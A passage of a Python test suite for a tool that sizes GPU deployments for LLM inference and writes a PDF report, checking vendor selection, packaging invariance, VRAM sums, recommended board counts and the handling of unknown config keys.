    answers = [
        str(list(gr.PRESETS.keys()).index("llama31-8b") + 1),
        str(list(gr.GPUS.keys()).index(gpu_key) + 1),
        str(n_gpu),
    ]
    if nvlink_answer is not None:
        answers.append(nvlink_answer)
    answers += ["3", "n", str(REQ["ctx"]), str(REQ["conc"])]
    with unittest.mock.patch("builtins.input", side_effect=answers), \
         contextlib.redirect_stdout(io.StringIO()):
        return gr.interactive_mode()


def check_interactive_skips_the_prompt():
    cfg = run_interactive_on(NO_NVLINK_GPU, 2)
    assert cfg["nvlink"] is False, f'{NO_NVLINK_GPU} came back with nvlink={cfg["nvlink"]!r}'

test("interactive_mode does not ask about NVLink on a card that has none",
     check_interactive_skips_the_prompt)


def check_interactive_still_asks_where_it_matters():
    cfg = run_interactive_on(NVLINK_GPU, 2, nvlink_answer="y")
    assert cfg["nvlink"] is True, f'{NVLINK_GPU} came back with nvlink={cfg["nvlink"]!r}'
    cfg = run_interactive_on(NVLINK_GPU, 2, nvlink_answer="n")
    assert cfg["nvlink"] is False, "answering n must still mean PCIe"

test("interactive_mode still asks — and honours the answer — on a card that has NVLink",
     check_interactive_still_asks_where_it_matters)


# ---- the vendor the PERF lookup has been reading all along ------------------
# compute() has looked up PERF[cfg["vendor"]] since the constants were hoisted,
# and no builder ever set the key, so every report silently took the nvidia
# fallback. That is harmless while nvidia is the only vendor in the table and
# actively wrong the moment it is not.
print("\nEvery builder sets the vendor its constants are chosen by")

def check_every_builder_sets_vendor():
    want = gr.GPUS[REQ["gpu"]]["vendor"]
    cli_cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    assert cli_cfg.get("vendor") == want, f"from_cli_args: {cli_cfg.get('vendor')!r}"

    path = write_json({"preset": "llama31-8b", "gpu": REQ["gpu"]})
    try:
        json_cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert json_cfg.get("vendor") == want, f"from_json: {json_cfg.get('vendor')!r}"

    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "gpu": REQ["gpu"]})
    try:
        raw_cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert raw_cfg.get("vendor") == want, f"from_json raw branch: {raw_cfg.get('vendor')!r}"

    interactive_cfg = run_interactive_on(REQ["gpu"], 1)
    assert interactive_cfg.get("vendor") == want, f"interactive_mode: {interactive_cfg.get('vendor')!r}"

test("from_cli_args / from_json / raw JSON / interactive_mode all set cfg['vendor']",
     check_every_builder_sets_vendor)


def check_vendor_tracks_the_card_not_the_json():
    path = write_json({"preset": "llama31-8b", "gpu": REQ["gpu"], "vendor": "amd"})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["vendor"] == gr.GPUS[REQ["gpu"]]["vendor"], (
        "a JSON-supplied vendor overrode the card's own — that would run NVIDIA "
        f"hardware on another vendor's constants: {cfg['vendor']!r}")

test("a vendor in the JSON cannot override the selected card's own",
     check_vendor_tracks_the_card_not_the_json)


def check_perf_lookup_actually_resolves():
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    assert cfg["vendor"] in gr.PERF, (
        f"cfg['vendor']={cfg['vendor']!r} is not a key in PERF, so compute() is "
        "still taking the fallback branch this commit exists to retire")
    comp = gr.compute(cfg)
    assert comp["perf_mbu"] == gr.PERF[cfg["vendor"]]["mbu"], (
        "compute() did not use the constants belonging to cfg['vendor']")

test("the vendor a builder sets is a real PERF key, and compute() uses its constants",
     check_perf_lookup_actually_resolves)


# ---- the default card is the catalog's, not a slug written in four places ---
def check_default_gpu_key_comes_from_the_catalog():
    flagged = [k for k, g in gr.GPUS.items() if g.get("default")]
    assert flagged == [gr.DEFAULT_GPU_KEY], (
        f"the catalog flags {flagged} as default but DEFAULT_GPU_KEY is {gr.DEFAULT_GPU_KEY!r}")
    path = write_json({"preset": "llama31-8b"})
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["gpu"] is gr.GPUS[gr.DEFAULT_GPU_KEY], (
        f'a config naming no GPU resolved to {cfg["gpu"]["name"]!r}')

test("a config that names no GPU gets the one the catalog marks default",
     check_default_gpu_key_comes_from_the_catalog)


# ---- the PDF says the same thing however the silicon is packaged -----------
# Every prose string in generate() is board-scoped or device-scoped, and an
# independent review reverted six of them one at a time without the suite
# noticing: the fit verdict, the over-by figure, the parallelism label, the
# notes gate, the interactive NVLink gate and the exported device view. The
# same guard the JS suite uses closes all of them at once — one dual-GCD board
# and two single-GCD boards are the same hardware, so the document must read
# the same, apart from what is genuinely counted in boards.
print("\nThe report reads the same however the silicon is packaged")

DUAL = {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2, "tflops": 383,
        "name": "X", "vendor": "nvidia", "devices": 2, "form": "sxm", "caps": {"fp8": True}}
SINGLE = dict(DUAL, gb=64, bw=DUAL["bw"] / 2, tflops=DUAL["tflops"] / 2,
              hyper=DUAL["hyper"] / 2, spec=DUAL["spec"] / 2, spot=DUAL["spot"] / 2, devices=1)


def report_text(card, boards, preset="llama31-70b", bpp=2, conc=16, **over):
    """Every string generate() puts in the document, in order."""
    cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=bpp, ctx=8192, conc=conc,
               n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
               hf_model="m", model_name="M", **over)
    card_obj = gr.ReportCard(cfg, output_path=os.devnull)
    seen = []

    def harvest(item):
        """Every string this flowable will put on the page.

        Drawings matter as much as paragraphs: the VRAM bar is a Drawing whose
        String children carry the component sizes and the "N GiB free" label,
        and a Spy that only knew about Paragraph and Table never saw them — so
        the bar could be drawn against the wrong capacity, contradicting the
        verdict three lines above it, with this test green.
        """
        text = getattr(item, "text", None)
        if text:
            seen.append(text)
        for row in getattr(item, "_cellvalues", []):
            for cell in row:
                harvest(cell) if hasattr(cell, "text") or hasattr(cell, "contents") \
                    else seen.append(str(cell))
        for child in getattr(item, "contents", []):
            harvest(child)

    real_build = gr.SimpleDocTemplate.build
    try:
        # generate() builds `story` locally; capture it through the doc it hands to.
        captured = {}

        def fake_build(self, story, **kw):
            captured["story"] = story
        gr.SimpleDocTemplate.build = fake_build
        card_obj.generate()
        for item in captured.get("story", []):
            harvest(item)
    finally:
        gr.SimpleDocTemplate.build = real_build
    return seen


def check_packaging_is_invisible_to_the_report():
    import re
    # Three configurations, because the verdict has three branches and only the
    # "does not fit" one was being reached: a 70B at BF16 overflows a 64 GiB
    # device, the same model at INT4 fits, and an 8B is comfortable.
    cases = [("llama31-70b", 2, 16, 1),     # over a 64 GiB device: DOES NOT FIT
             ("llama31-70b", 0.5, 16, 1),   # comfortable
             ("llama31-70b", 1, 20, 1),     # 60.0 of 64.0: TIGHT
             # 5 dual-GCD modules is 10 devices: TP=2 x DP=5, the only shape
             # that renders the data-parallel note, and no case reached it.
             ("llama31-70b", 2, 16, 5)]
    # A price per board is legitimately different — one dual-GCD module costs
    # what two single-GCD ones do — so currency cells are compared as totals
    # below rather than cell by cell.
    def norm(xs, boards, devices):
        """Only what is genuinely counted in boards is excused, and only where it
        actually is that count — an earlier version skipped every bare integer
        cell in the document, which hid the max-users figures too."""
        board_cells = {str(boards), f"{boards} ({boards * devices} devices)"}
        out = []
        for t in xs:
            if "$" in t or t in board_cells or t.startswith("Total/hr ("):
                continue
            # The shortfall is checked as a relation just above, so the figure
            # itself is normalised here rather than left to differ.
            t = re.sub(r"(Need|requires) \d+\+ boards", r"\1 N+ boards", t)
            t = re.sub(r"Smallest fit: \d+ boards", "Smallest fit: N boards", t)
            out.append(re.sub(r"\b\d+x X", "Nx X", t))
        return out

    def boards_needed(xs):
        """The shortfall, counted in boards, so it differs between the two
        packagings by exactly the devices-per-board factor — a relation to
        check, not a value to normalise away."""
        for t in xs:
            m = re.search(r"Smallest fit: (\d+) boards", t) or \
                re.search(r"(?:Need|requires) (\d+)\+ boards", t)
            if m:
                return int(m.group(1))
        return None
    verdicts = set()

    # and the totals themselves must match, or the exclusion above would hide
    # exactly the double-count this change exists to prevent
    def hourly(card, boards):
        cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), bpp=2, ctx=8192, conc=16,
                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"])
        c = gr.compute(cfg)
        return tuple(round(c[k], 6) for k in ("hourly_hyper", "hourly_spec", "hourly_spot"))
    assert hourly(DUAL, 1) == hourly(SINGLE, 2), (
        f"cost differs by packaging: {hourly(DUAL, 1)} vs {hourly(SINGLE, 2)}")
    for preset, bpp, conc, boards in cases:
        raw_a = report_text(DUAL, boards, preset, bpp, conc)
        raw_b = report_text(SINGLE, boards * 2, preset, bpp, conc)
        need_a, need_b = boards_needed(raw_a), boards_needed(raw_b)
        if need_b is not None:
            assert need_a == math.ceil(need_b / 2), (
                f"{preset} at {bpp}: the dual-GCD report needs {need_a} boards and the "
                f"single-GCD one {need_b} — two devices per board makes that "
                f"{math.ceil(need_b / 2)}")
        a, b = norm(raw_a, boards, 2), norm(raw_b, boards * 2, 1)
        assert a, "no text captured from the report — the spy is not seeing the story"
        verdicts.update(t.split("]")[0] for t in a if t.startswith("["))
        diffs = [f"{x!r} != {y!r}" for x, y in zip(a, b) if x != y]
        assert not diffs, (
            f"{preset} at {bpp} B/param, {conc} concurrent, differs between {boards} dual-GCD board(s) "
            f"and {boards * 2} single-GCD boards holding the same silicon:\n       " + "\n       ".join(diffs[:6]))
    assert len(verdicts) >= 3, (
        f"only reached the verdict branches {sorted(verdicts)} — the fits and tight "
        "branches carry their own capacity expression and go unchecked otherwise")

test("one dual-GCD board and two single-GCD boards produce the same report",
     check_packaging_is_invisible_to_the_report)


def check_compute_is_blind_to_packaging():
    """compute() itself, not the prose around it.

    The decode ceiling is the one arithmetic site no case exercised with more
    than one device per board: every other case is bandwidth-bound there, and
    the product device_tflops * device_count is unchanged by the sabotage —
    what moves is the interconnect penalty, 1.0 at one board against 0.85 at
    two devices. So it has to be compared where those two disagree.
    """
    bound = dict(params=30, active=10, layers=48, kv_heads=8, h_dim=128,
                 ctx=256, conc=256, bpp=2, kv_bpp=2, shared_exp=0, max_ctx=1048576)
    dual = gr.compute(dict(bound, n_gpu=1, gpu=DUAL, nvlink=True, vendor="nvidia"))
    single = gr.compute(dict(bound, n_gpu=2, gpu=SINGLE, nvlink=True, vendor="nvidia"))
    # Python's compute() exports no compute-bound flag (the JS engine does), so
    # bindingness is established directly: ten times the bandwidth must not move
    # the saturated figure if the compute ceiling is what is holding it.
    faster = gr.compute(dict(bound, n_gpu=1, gpu=dict(DUAL, bw=DUAL["bw"] * 10),
                             nvlink=True, vendor="nvidia"))
    assert abs(faster["sat_tok"] - dual["sat_tok"]) < 1, (
        "the probe is bandwidth-bound, so it does not exercise the compute ceiling")
    skip = {"gpu"}
    diffs = [f"{k}: {dual[k]!r} != {single[k]!r}" for k in dual
             if k not in skip and dual[k] != single.get(k)]
    assert not diffs, ("compute() differs between one dual-GCD board and two single-GCD "
                       "boards holding the same silicon:\n       " + "\n       ".join(diffs[:6]))

test("compute() gives the same answer however the silicon is packaged",
     check_compute_is_blind_to_packaging)


def check_capacity_label_keeps_integers_integral():
    """Stated absolutely, because every other assertion about capacity reads the
    formatter's own output and would follow a regression in it: dropping the
    integer rule turns "80 GiB" into "80.0 GiB" on all twelve rows."""
    assert gr.capacity_label(80) == "80 GiB", gr.capacity_label(80)
    assert gr.capacity_label(16) == "16 GiB", gr.capacity_label(16)
    assert gr.capacity_label(141) == "141 GiB", gr.capacity_label(141)
    assert gr.capacity_label(128 / 3) == "42.7 GiB", gr.capacity_label(128 / 3)

test("an integer capacity renders without a decimal in the PDF too",
     check_capacity_label_keeps_integers_integral)


def check_interactive_gates_nvlink_on_devices():
    """interactive_mode() decides whether to ask about NVLink at all.

    Every card the existing harness can select is one device per board, so
    n_gpu and the device count are always equal there and the gate could be
    reverted to the board count with the suite green. This puts a dual-GCD
    board in the catalog for the length of the test.
    """
    key = "__dual_probe"
    gr.GPUS[key] = dict(DUAL, name="Dual probe")
    try:
        # One board, two devices: the prompt must be asked, and answering "n"
        # must be honoured — a board-scoped gate would skip it and force PCIe.
        cfg = run_interactive_on(key, 1, nvlink_answer="y")
        assert cfg["nvlink"] is True, (
            "interactive_mode did not ask about NVLink on a single board that is "
            f"two devices: {cfg['nvlink']!r}")
        assert run_interactive_on(key, 1, nvlink_answer="n")["nvlink"] is False
    finally:
        del gr.GPUS[key]

test("interactive_mode asks about NVLink when one board is several devices",
     check_interactive_gates_nvlink_on_devices)


# ---- the parallelism row and the command it sits above --------------------
# Two gates, written differently, that have to agree for every input: the GPU
# configuration row branches on `device_count_for(cfg) > 1` and the command on
# `tp * dp > 1`. Both engines carry the same pair — index.html's badge branches
# on `computed.deviceCount > 1` beside a command gated on `tp * dp > 1`, and
# model.test.js checks that side. Now that both read one split off compute()
# they agree for every valid configuration, but "cannot drift apart" is a
# property, and until something checks it, it is a claim: this document has
# contradicted itself across exactly this pair before, which is why the comment
# above the row names the case.
print("\nThe parallelism row and the command below it describe the same split")


def report_strings(card, boards, **over):
    """Every string in the story, plus the cfg that produced it.

    Not a second harvester because report_text() misses the command — it does
    not. The command renders as one Paragraph per line
    (generate_report.py:826-828), so .text reaches every line of it and the
    packaging-invariance test above has always compared it; reverting
    build_vllm_cmd() to split on boards turns that test red. What the callers
    here need, and report_text() does not return, is the cfg alongside the
    strings, so a rendered divisor can be checked against the one the figure
    was actually computed with. The .lines walk is a forward guard only:
    nothing in the report is a Preformatted today.
    """
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-70b"]), ctx=8192, conc=16,
               n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
               hf_model="m", model_name="M", **over)
    obj = gr.ReportCard(cfg, output_path=os.devnull)
    seen = []

    def harvest(item):
        text = getattr(item, "text", None)
        if text:
            seen.append(text)
        for line in getattr(item, "lines", None) or []:
            seen.append(line if isinstance(line, str) else str(line))
        for row in getattr(item, "_cellvalues", []):
            for cell in row:
                harvest(cell) if hasattr(cell, "text") or hasattr(cell, "contents") \
                    else seen.append(str(cell))
        for child in getattr(item, "contents", []) or []:
            harvest(child)

    real_build = gr.SimpleDocTemplate.build
    captured = {}
    try:
        gr.SimpleDocTemplate.build = lambda self, story, **kw: captured.__setitem__("story", story)
        obj.generate()
        for item in captured.get("story", []):
            harvest(item)
    finally:
        gr.SimpleDocTemplate.build = real_build
    return cfg, seen


def check_parallelism_row_agrees_with_the_command():
    single_dev, multi_dev, skipped = 0, 0, 0
    for card in (dict(DUAL, devices=1, gb=80, name="S"), DUAL):
        for boards in (1, 2, 3, 4, 5, 8, 9, 12, 16, 17, 24, 64, 100, 128):
            for bpp in (2, 0.5):
                cfg, seen = report_strings(card, boards, bpp=bpp)
                # A command that does not fit is not a command: both engines
                # short-circuit to a comment before any flag is reached, so the
                # property genuinely does not hold there and asserting it would
                # only pin the short-circuit.
                if not gr.compute(cfg)["fits"]:
                    skipped += 1
                    continue
                rows = [t for t in seen if t == "Single device" or t.startswith("Tensor parallel")]
                assert len(rows) == 1, (
                    f"{boards}x {card['name']}: expected one parallelism row, found {rows!r}")
                says_single = rows[0] == "Single device"
                asks_for_none = not any("parallel-size" in t for t in seen)
                assert says_single == asks_for_none, (
                    f"{boards}x {card['name']} ({gr.device_count_for(cfg)} devices) at {bpp} B/param: "
                    f"the row says {rows[0]!r} while the command "
                    f"{'asks for no parallelism' if asks_for_none else 'asks for it'}: "
                    + repr([t for t in seen if "parallel-size" in t]))
                if says_single:
                    single_dev += 1
                else:
                    multi_dev += 1
    # Or an iff that only ever saw one of its two sides would pass regardless.
    assert single_dev and multi_dev, (
        f"not discriminating: {single_dev} single-device and {multi_dev} multi-device "
        f"fitting configurations ({skipped} skipped)")

test("the parallelism row says single device exactly when the command asks for none",
     check_parallelism_row_agrees_with_the_command)


# ---- the VRAM breakdown row adds up ---------------------------------------
# A reader adds a breakdown up. Before the weights divisor was corrected this
# row did add up, because nothing replicated; correcting it broke the relation
# and left a 263 GiB gap with no caption on a 12-device 70B. Pinned on the
# rendered cells rather than the arithmetic behind them, which is a tautology.
# The tolerance is the formatter's own: fmt_gb rounds to the integer above 100,
# one decimal above 10 and two below, so each cell carries at most half of its
# last digit.
print("\nThe VRAM breakdown row adds up to the total printed beside it")


def check_vram_breakdown_row_sums():
    import re

    def grain(v):
        return 0.5 if v >= 100 else 0.05 if v >= 10 else 0.005

    with_copies = single_copy = 0
    for preset, boards, card in (("llama31-70b", 12, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("llama31-70b", 1, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("llama31-70b", 4, DUAL),
                                 ("llama31-70b", 64, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("dsv3-671b", 16, dict(DUAL, devices=1, gb=80, name="S")),
                                 ("qwen3-30b", 12, dict(DUAL, devices=1, gb=80, name="S"))):
        cfg = dict(gr.arch_fields(gr.PRESETS[preset]), bpp=2, ctx=8192, conc=16,
                   n_gpu=boards, gpu=card, nvlink=True, kv_bpp=2, vendor=card["vendor"],
                   hf_model="m", model_name="M")
        comp = gr.compute(dict(cfg))
        blob = report_text(card, boards, preset=preset, bpp=2)
        # A metric cell is one Paragraph carrying its own label and value:
        #   <font ...>Weights (3 copies)</font><br/><font ...><b>391 GiB</b></font>
        # Parsed as pairs so this reads the cells the reader sees, not the
        # arithmetic behind them, which would be a tautology.
        cells = dict(re.findall(
            r"<font[^>]*>([^<]+)</font><br/><font[^>]*><b>([^<]+)</b></font>", "\n".join(blob)))
        label = "Weights" if comp["model_copies"] <= 1 else f"Weights ({comp['model_copies']:g} copies)"
        total_label = "Total" if comp["model_copies"] <= 1 else "Total (cluster)"
        assert label in cells, f"{preset} at {boards}: no {label!r} cell in the report: {sorted(cells)}"
        if comp["model_copies"] > 1:
            with_copies += 1
        else:
            single_copy += 1
        vals = []
        for want in (label, "KV cache", "Act + OH", total_label):
            assert want in cells, f"{preset} at {boards}: no {want!r} cell: {sorted(cells)}"
            vals.append(float(re.sub(r"[^0-9.]", "", cells[want])))
        tol = sum(grain(v) for v in vals)
        assert abs(vals[0] + vals[1] + vals[2] - vals[3]) <= tol, (
            f"{preset} at {boards} boards ({comp['model_copies']:g} copies): "
            f"{vals[0]} + {vals[1]} + {vals[2]} = {sum(vals[:3])}, but the row prints {vals[3]}")
    assert with_copies and single_copy, (
        f"only reached one regime: {with_copies} replicated, {single_copy} single-copy")

test("the report's VRAM breakdown row sums to its own total",
     check_vram_breakdown_row_sums)


# ---- the board count page 1 recommends -----------------------------------
# It used to be ceil(total_gb / (0.9 * device_gb)): a cluster total divided by
# one device's capacity, which is circular because buying boards changes the
# split. It did not merely round badly, it diverged — 70B AWQ over nine RTX
# 4090s printed "Need 15+ boards" and re-asking at fifteen printed 25, then 42;
# 123B bf16 over T4s printed a number where no board count ever fits. So the
# property is stated as something a reader can act on, without reference to any
# formula: whatever number the report prints, recomputing the configuration at
# that number must fit, and where nothing fits it must say so instead.
print("\nThe board count the report recommends is one this engine agrees with")


def check_recommended_board_count_actually_fits():
    import re
    recommended = impossible = 0
    for preset, bpp, card, boards in (("llama31-70b", 0.5, dict(DUAL, devices=1, gb=24, name="S"), 9),
                                      ("mistral-lg-123b", 2, dict(DUAL, devices=1, gb=16, name="S"), 24),
                                      ("llama31-70b", 2, dict(DUAL, devices=1, gb=80, name="S"), 1),
                                      ("llama31-70b", 2, DUAL, 1),
                                      ("dsv3-671b", 1, DUAL, 2)):
        cfg = dict(gr.arch_fields(gr.PRESETS[preset]), ctx=8192, conc=16, n_gpu=boards,
                   gpu=card, nvlink=True, kv_bpp=2, bpp=bpp, vendor=card["vendor"],
                   hf_model="m", model_name="M")
        comp = gr.compute(dict(cfg))
        if comp["fits"]:
            continue
        blob = "\n".join(report_text(card, boards, preset=preset, bpp=bpp))
        named = re.search(r"Smallest fit: (\d+) boards", blob)
        want, capped = gr.boards_needed(cfg, comp)
        if want is None:
            impossible += 1
            assert not named, f"nothing fits, but the report still names {named.group(1)} boards"
            assert not re.search(r"\d+\+ boards", blob), (
                "nothing fits, but the report claims a count and everything above it")
            assert "No number of these boards fits" in blob, (
                f"the report must say plainly that nothing fits:\n{blob[:400]}")
            assert capped is False, "a capped search must not be reported as impossible"
            continue
        recommended += 1
        assert named and int(named.group(1)) == want, (
            f"{preset}: report names {named and named.group(1)} boards, the search says {want}")
        # The claim: recompute the whole configuration there and ask the engine.
        at = gr.compute(dict(cfg, n_gpu=want))
        assert at["fits"], (
            f"{preset}: the report recommends {want} boards, which recomputes to "
            f"{at['per_total']} GiB per device against {at['device_gb']} "
            f"(TP={at['tp']} x DP={at['dp']})")
        # Smallest, not merely sufficient.
        for n in range(1, want):
            assert not gr.compute(dict(cfg, n_gpu=n))["fits"], (
                f"{preset}: {want} boards recommended but {n} already fits")
    assert recommended and impossible, (
        f"did not reach both outcomes: {recommended} recommended, {impossible} impossible")

test("recomputing at the recommended board count fits, or the report says none does",
     check_recommended_board_count_actually_fits)


# ---- the prose about the divisor, against the divisor ---------------------
# A number going wrong is caught by the pins in parity.test.py. A *sentence*
# going wrong is not: "Per-device VRAM above assumes weights sharded across all
# 12 devices" was a statement about the arithmetic, and the commit that started
# dividing by tp turned it false while every numeric assertion in this suite
# still passed. That is why this exists and why it went red on that commit
# rather than after it. This is the report README.md calls procurement-ready,
# and a document that misdescribes its own divisor is a worse failure than one
# that prints a wrong number, because the wrong number at least looks like one.
print("\nEvery sentence about the divisor states the divisor that was used")


def check_divisor_prose_matches_the_arithmetic():
    import re
    # Four kinds of claim, and conflating them hides exactly what the sentences
    # exist to disclose:
    #   divisor      what the per-device weights figure was divided by — tp for
    #                a dense model, the device count for an MoE.
    #   tp           what the emitted command shards by.
    #   dp           how many copies of the model the cluster holds.
    #   device_count what the KV cache was divided by, which is every device
    #                whatever the model does, because DP partitions requests.
    claims = [
        ("dense divisor claim",
         re.compile(r"weights and activations above are divided by (\d+), the sharding"), "tp"),
        ("dense KV claim",
         re.compile(r"KV cache is divided by all (\d+) devices"), "device_count"),
        ("dense replica claim",
         re.compile(r"full copy of the model in each of the (\d+) data-parallel"), "dp"),
        ("moe divisor claim",
         re.compile(r"Per-device weights above is divided by all (\d+) devices"), "divisor"),
        ("moe aside on attention", re.compile(r"shard only (\d+) ways"), "tp"),
        ("moe aside on the dense rule",
         re.compile(r"Dense models in this report divide by (\d+)"), "tp"),
        ("split claim", re.compile(r"TP=(\d+) x DP=(\d+) is a starting point"), ("tp", "dp")),
    ]
    seen = {name: 0 for name, _, _ in claims}
    for card, counts in ((dict(DUAL, devices=1, gb=80, name="S"),
                          (10, 12, 16, 20, 24, 40, 100, 128)),
                         # Boards that are two devices each: the sentence counts
                         # devices, and a board count that happened to be the
                         # divisor would hide the difference.
                         (DUAL, (5, 6, 8, 12))):
        for boards in counts:
            # Both regimes. A dense-only sweep leaves every MoE sentence unread,
            # and the MoE sentences are the ones describing a divisor this
            # engine deliberately did not correct.
            for active in (100, 5):
                cfg, text = report_strings(card, boards, bpp=0.5, active=active)
                comp = gr.compute(cfg)
                # Read back out of the result rather than assumed to be the
                # device count or tp: if the engine changes what it divides by,
                # this moves with it, and the test keeps comparing the prose
                # against the arithmetic instead of against an assumption of
                # its own.
                divisor = comp["weights_gb"] / comp["per_w"]
                targets = {"divisor": divisor, "tp": comp["tp"], "dp": comp["dp"],
                           "device_count": comp["device_count"]}
                blob = "\n".join(text)
                for name, rx, against in claims:
                    names = against if isinstance(against, tuple) else (against,)
                    for m in rx.finditer(blob):
                        seen[name] += 1
                        for claimed, key in zip(m.groups(), names):
                            want = targets[key]
                            assert abs(int(claimed) - want) <= abs(want) * 1e-9, (
                                f"{boards} boards x {card['devices']} devices, "
                                f"{'MoE' if comp['is_moe'] else 'dense'} "
                                f"(TP={comp['tp']} x DP={comp['dp']}): the {name} says "
                                f"{claimed}, but {key} is {want} — {m.group(0)!r}")
    # A regex that matches nothing asserts nothing, and rewording the note is
    # exactly how this test would stop looking with no one the wiser.
    silent = [n for n, k in seen.items() if not k]
    assert not silent, f"never found in any generated report: {silent}"

test("the note's divisor is the divisor the per-device figure was computed with",
     check_divisor_prose_matches_the_arithmetic)


# ---- tp/dp in a config are inert, and that is load-bearing ----------------
print("\ntp and dp in a JSON config are carried through and ignored")


def check_tp_dp_json_keys_are_inert():
    """compute() derives the split and reads nothing from cfg.

    from_json() copies through every key it does not recognise — the
    default-allow property this file pins elsewhere — and neither REQUEST_KEYS
    nor ARCH_TYPES mentions tp or dp, so validate_arch() never sees them. An
    earlier version of the split refactor read them here, and two previously
    inert keys became live and unvalidated: {"n_gpu": 1, "dp": 3} emitted
    --data-parallel-size 3 beside a "Single device" row, and {"tp": "4"} raised
    a TypeError out of `tp * dp`. Nothing but a comment defends that today, and
    a comment is not a test — the next person reasoning about where a TP/DP
    control would plug in will find exactly the same seam.
    """
    base = {"preset": "llama31-8b", "gpu": "h100-80", "n_gpu": 12,
            "bpp": 1, "ctx": 8192, "conc": 8}
    # The other from_json branch: no preset, cfg built straight from the user's
    # own keys, which is where an unknown key is copied through most directly.
    raw = {"params": 8, "layers": 32, "kv_heads": 8, "h_dim": 128, "gpu": "h100-80",
           "n_gpu": 9, "bpp": 1, "ctx": 8192, "conc": 8, "hf_model": "acme/raw-8b"}
    poisons = [{"tp": 1}, {"dp": 1}, {"tp": 16, "dp": 4}, {"tp": "4"},
               {"tp": 2.0}, {"tp": 0}, {"dp": -1}, {"tp": None}]
    for branch, spec in (("preset", base), ("raw", raw)):
        path = write_json(spec)
        try:
            clean_cfg = gr.from_json(path)
            clean = gr.compute(clean_cfg)
            clean_cmd = gr.build_vllm_cmd(clean_cfg, clean)
        finally:
            os.unlink(path)
        for poison in poisons:
            path = write_json(dict(spec, **poison))
            try:
                cfg = gr.from_json(path)
            finally:
                os.unlink(path)
            # The keys must actually arrive and be ignored. If from_json ever
            # started filtering them out this would pass for the wrong reason,
            # and the seam it is guarding would be open again the moment the
            # filter moved.
            missing = [k for k in poison if k not in cfg]
            assert not missing, (
                f"{branch} branch: {missing} never reached cfg, so this proves nothing "
                "about compute() ignoring them")
            got = gr.compute(cfg)
            drift = [f"{k}: {clean.get(k)!r} -> {got.get(k)!r}"
                     for k in set(clean) | set(got) if clean.get(k) != got.get(k)]
            assert not drift, (
                f"{branch} branch: {poison} changed compute()'s answer — "
                + "; ".join(drift[:4]))
            cmd = gr.build_vllm_cmd(cfg, got)
            assert cmd == clean_cmd, (
                f"{branch} branch: {poison} changed the emitted command:\n{cmd}")

test("tp and dp in a JSON config reach cfg and change nothing",
     check_tp_dp_json_keys_are_inert)


print(f"\n{pass_ct} passed, {fail_ct} failed\n")
sys.exit(1 if fail_ct else 0)
